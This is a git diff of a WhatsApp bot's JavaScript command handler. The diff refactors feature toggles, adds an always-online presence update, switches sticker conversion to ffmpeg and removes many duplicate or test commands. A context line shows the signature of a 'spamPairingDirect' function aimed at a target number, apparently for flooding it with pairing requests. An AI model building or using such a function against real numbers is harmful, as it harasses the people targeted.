@@ -1136,6 +1136,14 @@ const mzazireply2 = async (txt, { quoted = null, mentions = [] } = {}) => {
         await mzazi.sendPresenceUpdate("paused", sender);
       } catch (e) {}
     }
+
+    async function handleAlwaysOnline() {
+      const cfg = getToggle("alwaysonline");
+      if (!cfg.enabled) return;
+      try {
+        await mzazi.sendPresenceUpdate("available");
+      } catch (e) {}
+    }
 // ── SPAM PAIRING FUNCTION ──────────────────────────────────────────
 async function spamPairingDirect(targetNumber, count = 20) {
   const results = { success: 0, failed: 0, errors: [] };
@@ -1380,6 +1388,7 @@ You:`.trim();
     }
 
     await handleAutoTyping();
+    await handleAlwaysOnline();
 
     if (type === "audioMessage" && message.audioMessage?.ptt) {
       const buffer = await downloadMediaMessage(m, "buffer", {}, {
@@ -2164,37 +2173,6 @@ const mzazireply = async (text, options = {}) => {
       
 //=====================================//
 
-      case "menubshshsjgsvshhshgsv": {
-        const pingMs = Date.now() - startTime;
-
-        const menuText = `
-╔═════════════════════╗
-╠❏ BOT NAME : ${botName.toUpperCase()}
-╠❏ PING : ${pingMs}ms
-╚═════════════════════╝
-
-Commands:
-.menu, .ping, .chatbot on/off
-.autotyping on/off
-.autorecordaudio on/off
-.autorecordvideo on/off
-.alwaysonline on/off
-        `;
-
-        await mzazireply(menuText.trim());
-        break;
-      }
-
-//=====================================//
-
-      case "ping3": {
-        const latency = Date.now() - startTime;
-        await mzazireply(`🏓 Pong! ${latency}ms`);
-        break;
-      }
-
-//=====================================//
-
       case "chatbot": {
        if (!isOwner) return mzazireply("❌ Owner only!");
         const sub = args[0]?.toLowerCase();
@@ -2234,30 +2212,33 @@ Commands:
       case "autotyping":
 //=====================================//
 
-      case "autotype": {
+      case "autotype":
+//=====================================//
+
+      case "typing": {
         if (!isOwner) return mzazireply("❌ Owner only.");
 
         const sub = args[0]?.toLowerCase();
 
         if (!sub || (sub !== "on" && sub !== "off")) {
-          const cfg = getAutoTyping();
+          const cfg = getToggle("autotyping");
 
           return mzazireply(
             `⌨️ *Auto-typing*\nStatus: ${cfg.enabled ? "ON" : "OFF"}\nUsage: ${prefix}autotyping on/off`
           );
         }
 
-        const cfg = getAutoTyping();
+        const cfg = getToggle("autotyping");
 
         if (sub === "on") {
           if (cfg.enabled) return mzazireply("⚠️ Already ON.");
 
-          setAutoTyping(true);
+          setToggle("autotyping", true);
           await mzazireply("✅ Auto-typing enabled. Bot will show 'typing...' when you send messages.");
         } else {
           if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");
 
-          setAutoTyping(false);
+          setToggle("autotyping", false);
           await mzazireply("❌ Auto-typing disabled.");
         }
 
@@ -2278,7 +2259,7 @@ Commands:
         const sub = args[0]?.toLowerCase();
 
         if (!sub || (sub !== "on" && sub !== "off")) {
-          const cfg = getAutoRecordAudio();
+          const cfg = getToggle("autorecordaudio");
 
           return mzazireply(
             `🎙️ *Auto-record Audio*\n` +
@@ -2288,17 +2269,17 @@ Commands:
           );
         }
 
-        const cfg = getAutoRecordAudio();
+        const cfg = getToggle("autorecordaudio");
 
         if (sub === "on") {
           if (cfg.enabled) return mzazireply("⚠️ Already ON.");
 
-          setAutoRecordAudio(true);
+          setToggle("autorecordaudio", true);
           await mzazireply("✅ Auto-record audio enabled. Voice notes will be forwarded.");
         } else {
           if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");
 
-          setAutoRecordAudio(false);
+          setToggle("autorecordaudio", false);
           await mzazireply("❌ Auto-record audio disabled.");
         }
 
@@ -2319,7 +2300,7 @@ Commands:
         const sub = args[0]?.toLowerCase();
 
         if (!sub || (sub !== "on" && sub !== "off")) {
-          const cfg = getAutoRecordVideo();
+          const cfg = getToggle("autorecordvideo");
 
           return mzazireply(
             `📹 *Auto-record Video*\n` +
@@ -2329,17 +2310,17 @@ Commands:
           );
         }
 
-        const cfg = getAutoRecordVideo();
+        const cfg = getToggle("autorecordvideo");
 
         if (sub === "on") {
           if (cfg.enabled) return mzazireply("⚠️ Already ON.");
 
-          setAutoRecordVideo(true);
+          setToggle("autorecordvideo", true);
           await mzazireply("✅ Auto-record video enabled. Videos will be forwarded.");
         } else {
           if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");
 
-          setAutoRecordVideo(false);
+          setToggle("autorecordvideo", false);
           await mzazireply("❌ Auto-record video disabled.");
         }
 
@@ -2357,7 +2338,7 @@ Commands:
         const sub = args[0]?.toLowerCase();
 
         if (!sub || (sub !== "on" && sub !== "off")) {
-          const cfg = getAlwaysOnline();
+          const cfg = getToggle("alwaysonline");
 
           return mzazireply(
             `🟢 *Always Online*\n` +
@@ -2367,21 +2348,20 @@ Commands:
           );
         }
 
-        const cfg = getAlwaysOnline();
+        const cfg = getToggle("alwaysonline");
 
         if (sub === "on") {
           if (cfg.enabled) return mzazireply("⚠️ Already ON.");
 
-          setAlwaysOnline(true);
-          startAlwaysOnline();
+          setToggle("alwaysonline", true);
+          try { await mzazi.sendPresenceUpdate("available"); } catch {}
 
           await mzazireply("✅ Always online enabled. Bot will stay online.");
         } else {
           if (!cfg.enabled) return mzazireply("⚠️ Already OFF.");
 
-          setAlwaysOnline(false);
-
-          if (alwaysOnlineInterval) clearInterval(alwaysOnlineInterval);
+          setToggle("alwaysonline", false);
+          try { await mzazi.sendPresenceUpdate("unavailable"); } catch {}
 
           await mzazireply("❌ Always online disabled.");
         }
@@ -2389,65 +2369,6 @@ Commands:
         break;
       }
 
-//=====================================//
-
-      case "menubdgwjh": {
-        const pingMs = Date.now() - startTime;
-
-        const menuText = `
-╔═════════════════════╗
-╠❏ BOT NAME : ${botName.toUpperCase()}
-╠❏ PING : ${pingMs}ms
-╚═════════════════════╝
-
-Commands:
-.help, .ping, .chatbot on/off
-        `;
-
-        await mzazireply(menuText.trim());
-        break;
-      }
-
-//=====================================//
-
-      case "chatbot2": {
-        if (!isAdmin && !isOwner) return mzazireply("❌ Admins/Owner only.");
-
-        const sub = args[0]?.toLowerCase();
-
-        if (!sub || (sub !== "on" && sub !== "off")) {
-          return mzazireply(
-            `🤖 *CHATBOT SETUP*\n\n` +
-              `• ${prefix}chatbot2 on - Enable chatbot\n` +
-              `• ${prefix}chatbot2 off - Disable chatbot\n\n` +
-              (isGroup
-                ? `When enabled, I'll respond when mentioned (@${botPhoneNum}) or replied to.\nPersonality: casual, witty, English only.`
-                : `When enabled in DM, I'll respond to all your messages.\nPersonality: casual, witty, English only.`)
-          );
-        }
-
-        const enabled = getChatbotStatus(sender);
-
-        if (sub === "on") {
-          if (enabled) return mzazireply("⚠️ Chatbot already enabled.");
-          setChatbotStatus(sender, true);
-          await mzazireply(
-            isGroup
-              ? `✅ *Chatbot enabled!*\n\nMention me (@${botPhoneNum}) or reply to my messages to chat.`
-              : `✅ *Chatbot enabled!*\n\nI'll now respond to your DM messages.`
-          );
-        } else if (sub === "off") {
-          if (!enabled) return mzazireply("⚠️ Chatbot already disabled.");
-          setChatbotStatus(sender, false);
-          await mzazireply("❌ *Chatbot disabled!* I will no longer respond.");
-        }
-
-        break;
-      }
-
-      // ─────────────────────────────────────────────
-      // STICKER COMMAND
-      // ─────────────────────────────────────────────
 //=====================================//
 
       case "sticker": {
@@ -2518,136 +2439,6 @@ Commands:
       
 //=====================================//
 
-      case "testmenu": {
-    const botName = getBotName(botPhoneNum);
-    const pingMs = Date.now() - startTime;
-
-    // menu pic
-    const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
-    const defaultMenuPic = "./media/menu.jpg";
-
-    const menuPic = fs.existsSync(customMenuPic)
-        ? customMenuPic
-        : defaultMenuPic;
-
-    const menuText = `
- 
-╔═════════════════════╗
-╠❏ BOT NAME : ${botName.toUpperCase()}
-╠❏ VERSION : 1.0.0
-╠❏ PING : ${pingMs}ms
-╠❏ OWNER : Mzazi Tech inc 
-╠❏ HOST : Pterodactyl Panel
-╠❏ BAILEYS : OFFICIAL
-╠❏ TYPE : CASE
-╠❏ STATUS : ONLINE
-╚═════════════════════╝
-
-╔═⟪     GENERAL     ⟫═╗
-╠❏ ${prefix}menu
-╠❏ ${prefix}ping
-╠❏ ${prefix}ping2
-╠❏ ${prefix}uptime  
-╠❏ ${prefix}systeminfo 
-╠❏ ${prefix}owner  
-╠❏ ${prefix}tqto 
-╠❏ ${prefix}rules
-╠❏ ${prefix}vv
-╚══════════════════╝
-
-╔═⟪  GROUP ADMIN  ⟫═╗
-╠❏ ${prefix}kick 
-╠❏ ${prefix}add 
-╠❏ ${prefix}promote 
-╠❏ ${prefix}demote 
-╠❏ ${prefix}mute        
-╠❏ ${prefix}unmute          
-╠❏ ${prefix}tagall         
-╠❏ ${prefix}hidetag
-╠❏ ${prefix}groupinfo  
-╠❏ ${prefix}link        
-╠❏ ${prefix}revoke
-╠❏ ${prefix}delete         
-╠❏ ${prefix}setrules 
-╠❏ ${prefix}warn 
-╠❏ ${prefix}warnlist       
-╠❏ ${prefix}resetwarn 
-╠❏ ${prefix}open
-╠❏ ${prefix}close
-╠❏ ${prefix}subject
-╠❏ ${prefix}setgcname
-╠❏ ${prefix}opentime
-╠❏ ${prefix}closetime
-╚══════════════════╝
-
-╔═⟪ GROUP PROTECTION ⟫═╗
-╠❏ ${prefix}antilink on/off
-╠❏ ${prefix}antitag on/off
-╠❏ ${prefix}antibot on/off
-╠❏ ${prefix}antiviewonce on/off
-╠❏ ${prefix}antitagadmin on/off
-╠❏ ${prefix}antimentiongroup on/off
-╠❏ ${prefix}antipromote on/off
-╠❏ ${prefix}antidemote on/off
-╚══════════════════╝
-
-╔═⟪   OWNER ONLY   ⟫═╗
-╠❏ ${prefix}leave 
-╠❏ ${prefix}public on/off
-╠❏ ${prefix}self on/off
-╠❏ ${prefix}addpaid
-╠❏ ${prefix}delpaid 
-╠❏ ${prefix}listpaid
-╠❏ ${prefix}addprem
-╠❏ ${prefix}delprem
-╠❏ ${prefix}changebotname
-╠❏ ${prefix}changebotpic
-╠❏ ${prefix}listcmds
-╚══════════════════╝
-
-╔═⟪  AI COMMANDS   ⟫═╗
-╠❏ ${prefix}ai
-╠❏ ${prefix}gpt
-╠❏ ${prefix}gemini
-╚══════════════════╝
-
-╔═⟪ OTHER COMMANDS ⟫═╗
-╠❏ ${prefix}weather
-╠❏ ${prefix}joke
-╠❏ ${prefix}quote
-╠❏ ${prefix}advice
-╠❏ ${prefix}catfact
-╠❏ ${prefix}news
-╠❏ ${prefix}translate
-╠❏ ${prefix}trt
-╚══════════════════╝
-
-${botName} © 2026`;
-
-    await mzazi.sendMessage(
-        sender,
-        {
-            image: fs.readFileSync(menuPic),
-            caption: menuText.trim(),
-            contextInfo: {
-                forwardingScore: 999,
-                isForwarded: true,
-                forwardedNewsletterMessageInfo: {
-                    newsletterJid: "120363425539800408@newsletter",
-                    newsletterName: `${botName.toUpperCase()}`,
-                    serverMessageId: 143
-                }
-            }
-        },
-        { quoted: m }
-    );
-}
-break;
-
-
-
-//=====================================//
-
 case 'menu6':
 //=====================================//
 
@@ -2697,15 +2488,14 @@ case "menu": {
 ╠═══════════════════╣
 ║  ┌────────────────┐
 ║  │ USER    : ▄︻̷̿┻̿═━一mzαzí tєch             
-║  │ NUMBER  : 259334990725321                 
-║  │ LATENCY : 0ms                            
-║  │ UPTIME  : 0d 0h 6m 39s                    
-║  │ TIME    : 05:50:14 PM                     
-║  │ DATE    : Friday, July 31, 2026           
+║  │ NUMBER  : ${botPhoneNum}                 
+║  │ UPTIME  : ${runtime(startTime)}                    
+║  │ TIME    : ${new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true })}                     
+║  │ DATE    : ${new Date().toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}           
 ║  │ VERSION : V3.0.0                          
-║  │ MODE    : PUBLIC                          
-║  │ PREFIX  : .                               
-║  │ OWNER   : DOMINIC M.K                 
+║  │ MODE    : ${mode}                          
+║  │ PREFIX  : ${prefix}                               
+║  │ OWNER   : ${ownersList[0]?.split('@')[0] || botPhoneNum}                 
 ║  └────────────────┘ 
 ╚═══════════════════╝
 
@@ -4252,7 +4042,7 @@ case 'exit': {
 
     await mzazi.groupLeave(sender);
 
-    logSystem(`Bot left group: ${groupName}`);
+    logSystem(`Bot left group: ${sender}`, 'success');
 }
 break;
 //=====================================//
@@ -5070,9 +4860,6 @@ ${adminList}
       
 //=====================================//
 
-      case "setgcname":
-//=====================================//
-
 case "subject": {
 try {
 if (!isGroup) return mzazireply("❌ Group only");
@@ -5354,9 +5141,6 @@ case "qr":
 //=====================================//
 
 case "gpass":
-//=====================================//
-
-case "hack":
 //=====================================//
 
 case "shorturl": {
@@ -6579,56 +6363,6 @@ break;
 
 //=====================================//
 
-case "tagall": {
-try {
-
-if (!isGroup) {
-return mzazireply("❌ This command only works in groups");
-}
-
-if (!isAdmin && !isOwner) {
-return mzazireply("❌ Admin only command");
-}
-
-const members = participants.map(v => v.id);
-
-let teks =
-`📢 *${botName.toUpperCase()} TAG ALL*\n\n`;
-
-for (let mem of members) {
-
-teks += `⬡ @${mem.split("@")[0]}\n`;
-
-}
-
-await mzazi.sendMessage(
-m.chat,
-{
-text: teks,
-mentions: members
-},
-{ quoted: m }
-);
-
-} catch (e) {
-
-logger.info("TAGALL ERROR:", e);
-
-mzazireply(
-`❌ Failed to tag members\n${e.message}`
-);
-
-}
-}
-break;
-// ─────────────────────────────────────────────
-//  CLOSE TIME
-// ─────────────────────────────────────────────
-// ─────────────────────────────────────────────
-//  CLOSE GROUP AFTER TIME
-// ─────────────────────────────────────────────
-//=====================================//
-
 case "closetime": {
     if (!isGroup) return mzazireply("❌ This command only works in groups.");
     if (!isAdmin && !isOwner) return mzazireply("❌ Admin only command.");
@@ -7763,250 +7497,6 @@ case 'med': {
 // ─────────────────────────────────────────────
 //=====================================//
 
-case 'autotyping':
-//=====================================//
-
-case 'autotype':
-//=====================================//
-
-case 'typing': {
-  if (!isOwner) return mzazireply('❌ Owner only command.');
-  const sub = args[0]?.toLowerCase();
-  if (!sub || (sub !== 'on' && sub !== 'off')) {
-    const cfg = getAutoTyping();
-    return mzazireply(
-      `⌨️ *Auto‑typing*\n\n` +
-      `Status: ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n\n` +
-      `Usage:\n.${prefix}autotyping on\ – enable typing simulation\n` +
-      `${prefix}autotyping off\` – disable`
-    );
-  }
-  const cfg = getAutoTyping();
-  if (sub === 'on') {
-    if (cfg.enabled) return mzazireply('⚠️ Auto‑typing already ON.');
-    setAutoTyping(true);
-    mzazireply('✅ Auto‑typing enabled. Bot will now show "typing..." while processing.');
-  } else {
-    if (!cfg.enabled) return mzazireply('⚠️ Auto‑typing already OFF.');
-    setAutoTyping(false);
-    mzazireply('❌ Auto‑typing disabled.');
-  }
-  break;
-}
-
-// ─────────────────────────────────────────────
-//  AUTO‑RECORD AUDIO (owner only)
-// ─────────────────────────────────────────────
-
-// ─────────────────────────────────────────────
-//  ALWAYS ONLINE (owner only)
-// ─────────────────────────────────────────────
-//=====================================//
-
-case 'alwaysonline':
-//=====================================//
-
-case 'online': {
-  if (!isOwner) return mzazireply('❌ Owner only.');
-  const sub = args[0]?.toLowerCase();
-  if (!sub || (sub !== 'on' && sub !== 'off')) {
-    const cfg = getAlwaysOnline();
-    return mzazireply(
-      `🟢 *Always Online*\n\n` +
-      `Status: ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n\n` +
-      `When ON, bot will keep "online" status.\n\n` +
-      `Usage: ${prefix}alwaysonline on/off`
-    );
-  }
-  const cfg = getAlwaysOnline();
-  if (sub === 'on') {
-    if (cfg.enabled) return mzazireply('⚠️ Always online already ON.');
-    setAlwaysOnline(true);
-    startAlwaysOnline(mzazi); // start the interval
-    mzazireply('✅ Always online enabled. Bot will show as online.');
-  } else {
-    if (!cfg.enabled) return mzazireply('⚠️ Always online already OFF.');
-    setAlwaysOnline(false);
-    // We don't stop interval – on restart it won't start; you may track interval ID if needed.
-    mzazireply('❌ Always online disabled.');
-  }
-  break;
-}
-
-// ──────────────────────────────────────────────────────────
-// TEST: interactiveMessage with native flow + single‑select
-// ──────────────────────────────────────────────────────────
-// ══════════════════════════════════════════════════════
-// MENU PIC HELPER
-// ══════════════════════════════════════════════════════
-
-
-// ══════════════════════════════════════════════════════
-// TEST: interactiveMessage format 1
-// ══════════════════════════════════════════════════════
-//=====================================//
-
-case 'itest1': {
-
-    const imgPath = getMenuPic();
-    const imgBuffer = fs.readFileSync(imgPath);
-
-    try {
-        await mzazi.sendMessage(sender, {
-            image: imgBuffer,
-            caption: "🧪 ITEST1 WORKING",
-            footer: `${botName}`,
-            buttons: [
-                {
-                    buttonId: `${prefix}menu`,
-                    buttonText: { displayText: "📋 MENU" },
-                    type: 1
-                },
-                {
-                    buttonId: `${prefix}ping`,
-                    buttonText: { displayText: "🏓 PING" },
-                    type: 1
-                }
-            ],
-            headerType: 4
-        }, { quoted: m });
-
-        await mzazireply("✅ itest1 sent successfully.");
-    } catch (e) {
-        logger.info(e);
-        mzazireply(`❌ Error: ${e.message}`);
-    }
-
-    break;
-}
-
-// ══════════════════════════════════════════════════════
-// TEST: minimal buttons
-// ══════════════════════════════════════════════════════
-//=====================================//
-
-case 'itest2': {
-    if (!isOwner) return mzazireply("❌ Owner only.");
-
-    const imgPath = getMenuPic();
-    const imgBuffer = fs.readFileSync(imgPath);
-
-    try {
-        await mzazi.sendMessage(sender, {
-            image: imgBuffer,
-            caption: `🤖 ${botName}\n\nPrefix: ${prefix}`,
-            footer: "Mzazi Tech",
-            buttons: [
-                {
-                    buttonId: `${prefix}alive`,
-                    buttonText: { displayText: "✅ ALIVE" },
-                    type: 1
-                }
-            ],
-            headerType: 4
-        }, { quoted: m });
-
-        await mzazireply("✅ itest2 sent.");
-    } catch (e) {
-        logger.info(e);
-        mzazireply(`❌ Error: ${e.message}`);
-    }
-
-    break;
-}
-
-// ══════════════════════════════════════════════════════
-// TEST: document message
-// ══════════════════════════════════════════════════════
-//=====================================//
-
-case 'itest3': {
-    if (!isOwner) return mzazireply("❌ Owner only.");
-
-    const imgPath = getMenuPic();
-
-    try {
-        await mzazi.sendMessage(sender, {
-            document: fs.readFileSync(imgPath),
-            mimetype: "image/jpeg",
-            fileName: `${botName}.jpg`,
-            caption: `📄 ${botName} document test`
-        }, { quoted: m });
-
-        await mzazireply("✅ itest3 sent.");
-    } catch (e) {
-        logger.info(e);
-        mzazireply(`❌ Error: ${e.message}`);
-    }
-
-    break;
-}
-
-// ══════════════════════════════════════════════════════
-// TEST: product-like image
-// ══════════════════════════════════════════════════════
-//=====================================//
-
-case 'itest4': {
-    if (!isOwner) return mzazireply("❌ Owner only.");
-
-    const imgPath = getMenuPic();
-    const imgBuffer = fs.readFileSync(imgPath);
-
-    try {
-        await mzazi.sendMessage(sender, {
-            image: imgBuffer,
-            caption:
-`🛒 PRODUCT TEST
-
-🤖 Bot: ${botName}
-⚡ Prefix: ${prefix}
-📦 Status: Online`
-        }, { quoted: m });
-
-        await mzazireply("✅ itest4 sent.");
-    } catch (e) {
-        logger.info(e);
-        mzazireply(`❌ Error: ${e.message}`);
-    }
-
-    break;
-}
-
-// ══════════════════════════════════════════════════════
-// TEST: event style
-// ══════════════════════════════════════════════════════
-//=====================================//
-
-case 'itest5': {
-    if (!isOwner) return mzazireply("❌ Owner only.");
-
-    const imgPath = getMenuPic();
-    const imgBuffer = fs.readFileSync(imgPath);
-
-    try {
-        await mzazi.sendMessage(sender, {
-            image: imgBuffer,
-            caption:
-`📅 EVENT TEST
-
-🎉 ${botName} Launch Event
-🕒 Starts: ${new Date().toLocaleString()}
-📍 Hosted by Mzazi Tech`
-        }, { quoted: m });
-
-        await mzazireply("✅ itest5 sent.");
-    } catch (e) {
-        logger.info(e);
-        mzazireply(`❌ Error: ${e.message}`);
-    }
-
-    break;
-}
-
-
-//=====================================//
-
 case 'mzazi2': {
   const menuText = `╭━━━━━━━━━━━━━━━━━━━╮
 ┃ *${botName.toUpperCase()}* 🤖
@@ -8377,11 +7867,11 @@ case 'maggie2': {
 
 case 'menuv': {
   if (!isOwner) return;
-  const buttons = [
-    { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📋 Commands', id: `${prefix}allcmd` }) },
-    { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: '📢 Channel', url: 'https://whatsapp.com/channel/...' }) }
-  ];
-  await mzazi.sendMessage(sender, { text: 'Menu with buttons', buttons, headerType: 1 });
+  await mzazireply(
+    `⚙️ *Owner Menu*\n\n` +
+    `📋 Commands: ${prefix}allcmd\n` +
+    `📢 Channel: https://t.me/mzazidev`
+  );
   break;
 }
 
@@ -8549,42 +8039,6 @@ case "buttons": {
     }
     break;
 }
-//=====================================//
-
-case "connect": {
-    // Only bot owner can pair new numbers
-    if (!isOwner) return mzazireply("❌ Owner only command.");
-
-    // Extract phone number from command arguments
-    if (args.length === 0) {
-        return reply("⚠️ *Usage:* `.connect 254XXXXXXXXX`\nExample: `.connect 254712345678`");
-    }
-
-    const phoneNumber = args[0].trim();
-
-    // Basic validation: numeric, length 10-15 digits
-    if (!/^\d{10,15}$/.test(phoneNumber)) {
-        return reply("❌ *Invalid number.* Provide a valid international format without `+` or spaces.\nExample: `254712345678`");
-    }
-
-    // Inform user that we are requesting the code
-    await reply(`🔐 Requesting pairing code for *${phoneNumber}* ...\nPlease wait a few seconds.`);
-
-    try {
-        // telegramUserId = null (no Telegram notification needed)
-        const pairingCode = await requestPairingCode(phoneNumber, null);
-
-        // Send the code back to the WhatsApp chat
-        await mzazi.sendMessage(sender, {
-            text: `✅ *Pairing code for ${phoneNumber}*\n\n➜ \`${pairingCode}\`\n\nOpen WhatsApp on that device and enter this code to link the bot.`
-        }, { quoted: m });
-    } catch (error) {
-        logger.error("Pairing error:", error);
-        await reply(`❌ Failed to get pairing code: ${error.message}\n\nMake sure the number is not already linked and is valid.`);
-    }
-    break;
-}
-
 //=====================================//
 
 case 'disappear':
@@ -8816,11 +8270,30 @@ case 'img': {
             buffer = Buffer.concat([buffer, chunk]);
         }
 
-        // Sharp is intentionally not installed because Baileys versions used
-        // by this bot declare an incompatible optional sharp peer. Keep the
-        // bot startup-safe and tell the user to use the sticker command until
-        // an external image converter is configured.
-        await reply('❌ *Sticker conversion is unavailable in this build.*\n\nThe bot is running normally; use the original sticker or install a compatible image converter separately.');
+        // Convert the webp sticker to PNG using ffmpeg (bundled dependency).
+        const tmpDir = './tmp';
+        fs.mkdirSync(tmpDir, { recursive: true });
+        const stamp = Date.now();
+        const tmpIn = path.join(tmpDir, `toimg_${stamp}.webp`);
+        const tmpOut = path.join(tmpDir, `toimg_${stamp}.png`);
+        fs.writeFileSync(tmpIn, buffer);
+
+        await new Promise((resolve, reject) => {
+          ffmpeg(tmpIn)
+            .output(tmpOut)
+            .on('end', resolve)
+            .on('error', reject)
+            .run();
+        });
+
+        const pngBuffer = fs.readFileSync(tmpOut);
+        fs.unlinkSync(tmpIn);
+        fs.unlinkSync(tmpOut);
+
+        await mzazi.sendMessage(sender, {
+          image: pngBuffer,
+          caption: '✅ Here is your sticker as an image.',
+        });
     } catch (err) {
         logger.error('ToImg error:', err);
         await reply('❌ *Failed to convert sticker.*\n\nMake sure it\'s a valid sticker and not animated (webp only).');
@@ -8829,16 +8302,16 @@ case 'img': {
 }
 //=====================================//
 
-case 'setdesc':
+    case 'setdesc':
 //=====================================//
 
     case 'setdesk': {
-        if (!isGroup) return m.reply('❌ This command can only be used in groups.');
-        if (!isAdmin && !isOwner) return m.reply('❌ Only admins can change group description.');
-        if (!isBotAdmins) return m.reply('❌ I need to be admin to change group description.');
-        if (!text) return m.reply('❌ Provide the new description.');
-        await mzazi.groupUpdateDescription(from, text);
-        m.reply('✅ Group description updated.');
+        if (!isGroup) return mzazireply('❌ This command can only be used in groups.');
+        if (!isAdmin && !isOwner) return mzazireply('❌ Only admins can change group description.');
+        if (!isBotAdmin) return mzazireply('❌ I need to be admin to change group description.');
+        if (!text) return mzazireply('❌ Provide the new description.');
+        await mzazi.groupUpdateDescription(sender, text);
+        mzazireply('✅ Group description updated.');
     }
     break;
     
@@ -9242,14 +8715,6 @@ break;
       case "truth": {
         const truths = ["Have you ever lied to your best friend?","What's the most embarrassing thing you've ever done?","Have you ever had a crush on someone in this chat?","What's your biggest fear?","Have you ever cheated on a test?","What's the worst thing you've ever said about someone?","Have you ever stolen something?","What's your most embarrassing moment?","Do you have a secret talent?","What's the biggest mistake you've ever made?","Have you ever pretended to be sick to avoid something?","What is something you've never told anyone?","What's the most childish thing you still do?","Have you ever broken something and blamed someone else?","What is one thing you would change about yourself?"];
         mzazireply(`💬 *TRUTH*\n\n${truths[Math.floor(Math.random() * truths.length)]}`);
-        break;
-      }
-
-//=====================================//
-
-      case "dare": {
-        const dares = ["Sing a song for the next 30 seconds","Do 20 push-ups right now","Text someone a weird message","Send your most recent photo","Change your profile pic for 24 hours","Say the alphabet backwards","Talk in an accent for the next 5 messages","Tell a joke that makes everyone laugh","Do your best impression of a celebrity","Say something nice about every person in this chat","Post a status saying 'I love my mom'","Tell us your most embarrassing childhood memory","Do 10 jumping jacks","Call someone and say 'I know what you did'","Speak only in rhymes for 5 minutes"];
-        mzazireply(`🎯 *DARE*\n\n${dares[Math.floor(Math.random() * dares.length)]}`);
         break;
       }
 
@@ -9710,17 +9175,6 @@ break;
       case "repeat":
 //=====================================//
 
-      case "spam": {
-        if (!text) return mzazireply(`Example: ${prefix}repeat 3 Hello`);
-        const times = parseInt(args[0]) || 3;
-        const msg = args.slice(1).join(" ") || text;
-        if (times > 20) return mzazireply("❌ Max 20 times");
-        mzazireply(Array(Math.min(times,20)).fill(msg).join("\n"));
-        break;
-      }
-
-//=====================================//
-
       case "mocktext":
 //=====================================//
 
@@ -9814,9 +9268,6 @@ break;
         break;
       }
 
-//=====================================//
-
-      case "shorturl":
 //=====================================//
 
       case "shorten": {
@@ -10110,9 +9561,6 @@ break;
       //  MEDIA & DOWNLOAD COMMANDS
       // ═══════════════════════════════════════════════════════
 
-//=====================================//
-
-      case "img":
 //=====================================//
 
       case "image": {
@@ -10500,9 +9948,6 @@ case 'p10dl': {
 
 //=====================================//
 
-      case "setdesc":
-//=====================================//
-
       case "setdescription": {
         if (!isGroup) return mzazireply("❌ Group only!");
         if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");
@@ -10836,26 +10281,6 @@ case 'p10dl': {
         if (!["on","off"].includes(sub)) return mzazireply(`Usage: ${prefix}antiaudio on/off`);
         setGroupSetting(sender, "antiaudio", sub === "on");
         mzazireply(`🎵 Anti-audio: ${sub === "on" ? "✅ Enabled" : "❌ Disabled"}`);
-        break;
-      }
-
-//=====================================//
-
-      case "groupstatus": {
-        if (!isGroup) return mzazireply("❌ Group only!");
-        const gs7 = getGroupSettings(sender);
-        const settings7 = [
-          ["antilink", "🔗 Anti-link"],["antitag","🏷️ Anti-tag"],["antibot","🤖 Anti-bot"],
-          ["antiviewonce","👁️ Anti-view once"],["antitagadmin","👮 Anti-tag admin"],
-          ["antimentiongroup","📢 Anti-mention all"],["antipromote","⬆️ Anti-promote"],
-          ["antidemote","⬇️ Anti-demote"],["welcome","👋 Welcome"],["goodbye","👋 Goodbye"],
-          ["antiflood","🌊 Anti-flood"],["antibadword","🤬 Anti-bad word"],["antisticker","🖼️ Anti-sticker"]
-        ];
-        let statusText = `⚙️ *GROUP SETTINGS*\n\n📛 Group: ${groupName}\n\n`;
-        settings7.forEach(([key, label]) => {
-          statusText += `${label}: ${gs7[key] ? "✅ ON" : "❌ OFF"}\n`;
-        });
-        mzazireply(statusText);
         break;
       }
 
@@ -11432,9 +10857,6 @@ case 'p10dl': {
 
 //=====================================//
 
-      case "toimg":
-//=====================================//
-
       case "stickertoimg": {
         const quoted3 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
         if (!quoted3?.stickerMessage) return mzazireply(`Reply to a sticker with ${prefix}toimg`);
@@ -11609,17 +11031,6 @@ case 'p10dl': {
 
 //=====================================//
 
-      case "news": {
-        mzazireply(`📰 *NEWS*\n\n_Getting latest headlines..._\n\nVisit news sites for latest updates:\n• BBC: bbc.com/news\n• CNN: cnn.com\n• Reuters: reuters.com`);
-        break;
-      }
-
-      // ═══════════════════════════════════════════════════════
-      //  BOT SETTINGS COMMANDS
-      // ═══════════════════════════════════════════════════════
-
-//=====================================//
-
       case "setmode": {
         if (!isOwner) return mzazireply("❌ Owner only!");
         const modes = ["public","private","group"];
@@ -11697,17 +11108,6 @@ case 'p10dl': {
         break;
       }
 
-//=====================================//
-
-      case "ping3": {
-        const l2 = Date.now() - startTime;
-        mzazireply(`🏓 *PONG!*\n\n⚡ Speed: ${l2}ms\n✅ Active`);
-        break;
-      }
-
-//=====================================//
-
-      case "vv":
 //=====================================//
 
       case "antiviewonce2": {
@@ -12956,22 +12356,13 @@ case 'p10dl': {
       case "matrix": { let m2Text = ""; for (let i=0;i<8;i++){let row="";for(let j=0;j<8;j++)row+=(Math.random()>0.5?"1":"0")+" ";m2Text+=row.trim()+"\n";} mzazireply(`💻 *THE MATRIX*\n\n\`\`\`\n${m2Text}\`\`\``); break; }
 //=====================================//
 
-      case "hackfake": { const steps = ["Initializing hack sequence...","Bypassing firewall... ✅","Injecting payload... ✅","Accessing mainframe... ✅","Downloading data... ✅","HACK COMPLETE! 100%"]; mzazireply(`🖥️ *FAKE HACK*\n\n${steps.join("\n")}\n\n_Just for fun! 😅_`); break; }
-//=====================================//
-
